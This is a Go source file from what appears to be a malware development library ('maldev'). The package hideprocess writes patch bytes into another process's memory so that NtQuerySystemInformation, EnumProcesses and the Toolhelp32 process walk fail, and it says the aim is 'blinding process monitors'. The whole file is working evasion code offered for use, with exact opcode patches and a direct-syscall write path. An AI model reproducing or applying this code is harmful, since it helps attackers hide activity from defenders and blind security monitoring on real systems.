//go:build windows

package hideprocess

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// nqsiPatch overwrites NtQuerySystemInformation with "mov eax, 0xC0000002; ret"
// (STATUS_NOT_IMPLEMENTED). 6 bytes total.
var nqsiPatch = []byte{0xB8, 0x02, 0x00, 0x00, 0xC0, 0xC3}

// boolFalsePatch overwrites a Win32 BOOL function entry with "xor eax, eax; ret".
// The caller observes the function as failed (FALSE). 3 bytes — small enough to
// fit any standard prologue without smashing instruction boundaries.
var boolFalsePatch = []byte{0x33, 0xC0, 0xC3}

// Patch targets resolved lazily. Direct kernel32 / psapi exports (golang.org/x/sys/windows
// has typed wrappers we cannot patch the address of, so we resolve here).
var (
	procK32EnumProcesses = api.Kernel32.NewProc("K32EnumProcesses")
	procProcess32FirstW  = api.Kernel32.NewProc("Process32FirstW")
	procProcess32NextW   = api.Kernel32.NewProc("Process32NextW")
)

// PatchProcessMonitor patches NtQuerySystemInformation in the target process
// so it always returns STATUS_NOT_IMPLEMENTED, blinding process monitors.
// Requires PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the target.
// caller may be nil (falls back to VirtualProtectEx + WriteProcessMemory).
//
// NtQuerySystemInformation has the same address in every process on Win8+
// (ntdll ASLR is per-boot, shared across all processes via the same pages),
// so we resolve the export in-process and write the patch at that address
// in the target.
func PatchProcessMonitor(pid int, caller *wsyscall.Caller) error {
	return patchExport(pid, api.ProcNtQuerySystemInformation, "NtQuerySystemInformation", nqsiPatch, caller)
}

// PatchEnumProcesses patches kernel32!K32EnumProcesses in the target process to
// "xor eax, eax; ret" so EnumProcesses reports failure. Both psapi.dll!EnumProcesses
// and kernel32.dll!K32EnumProcesses are covered: psapi's export is a forwarder
// resolved at GetProcAddress time to the kernel32 implementation, which is what
// we patch.
//
// Requires PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the target.
// caller may be nil (falls back to VirtualProtectEx + WriteProcessMemory).
func PatchEnumProcesses(pid int, caller *wsyscall.Caller) error {
	return patchExport(pid, procK32EnumProcesses, "K32EnumProcesses", boolFalsePatch, caller)
}

// PatchToolhelp patches kernel32!Process32FirstW and kernel32!Process32NextW in
// the target process to "xor eax, eax; ret" so the Toolhelp32 walk returns
// FALSE on the first call. Hides every process from snapshots produced via
// CreateToolhelp32Snapshot + Process32{First,Next}W.
//
// Requires PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the target.
// caller may be nil (falls back to VirtualProtectEx + WriteProcessMemory).
//
// Returns the first error encountered; partial application is possible (the
// First patch may land while the Next patch fails). Re-running is safe — the
// patch bytes are idempotent.
func PatchToolhelp(pid int, caller *wsyscall.Caller) error {
	if err := patchExport(pid, procProcess32FirstW, "Process32FirstW", boolFalsePatch, caller); err != nil {
		return err
	}
	return patchExport(pid, procProcess32NextW, "Process32NextW", boolFalsePatch, caller)
}

// PatchAll applies PatchProcessMonitor + PatchEnumProcesses + PatchToolhelp.
// Returns the first error encountered. The Nt-level patch lands first because
// it is the broadest blind (system-wide process enumerations all bottom out
// in NtQuerySystemInformation); the Win32 patches fill the gap for clients
// that bypass ntdll via psapi or Toolhelp.
func PatchAll(pid int, caller *wsyscall.Caller) error {
	if err := PatchProcessMonitor(pid, caller); err != nil {
		return fmt.Errorf("PatchProcessMonitor: %w", err)
	}
	if err := PatchEnumProcesses(pid, caller); err != nil {
		return fmt.Errorf("PatchEnumProcesses: %w", err)
	}
	if err := PatchToolhelp(pid, caller); err != nil {
		return fmt.Errorf("PatchToolhelp: %w", err)
	}
	return nil
}

// patchExport opens the target, resolves the export's in-process address
// (which is identical across processes for kernel32/ntdll on Win8+ — same
// pages are shared via session-wide ASLR), and writes the patch.
func patchExport(pid int, proc *windows.LazyProc, name string, patch []byte, caller *wsyscall.Caller) error {
	if err := proc.Find(); err != nil {
		return fmt.Errorf("resolve %s: %w", name, err)
	}
	hProc, err := windows.OpenProcess(
		windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|windows.PROCESS_QUERY_INFORMATION,
		false,
		uint32(pid),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)
	return remoteWrite(hProc, proc.Addr(), patch, caller)
}

func remoteWrite(hProc windows.Handle, addr uintptr, patch []byte, caller *wsyscall.Caller) error {
	size := uintptr(len(patch))

	if caller != nil {
		r, err := caller.Call("NtWriteVirtualMemory",
			uintptr(hProc),
			addr,
			uintptr(unsafe.Pointer(&patch[0])),
			uintptr(len(patch)),
			0,
		)
		if r != 0 {
			return fmt.Errorf("NtWriteVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
		}
		return nil
	}

	var oldProtect uint32
	if err := windows.VirtualProtectEx(hProc, addr, size, windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtectEx: %w", err)
	}

	var written uintptr
	if err := windows.WriteProcessMemory(hProc, addr, &patch[0], size, &written); err != nil {
		// Restore protection even on write failure.
		var dummy uint32
		windows.VirtualProtectEx(hProc, addr, size, oldProtect, &dummy) //nolint:errcheck
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	var dummy uint32
	windows.VirtualProtectEx(hProc, addr, size, oldProtect, &dummy) //nolint:errcheck
	return nil
}
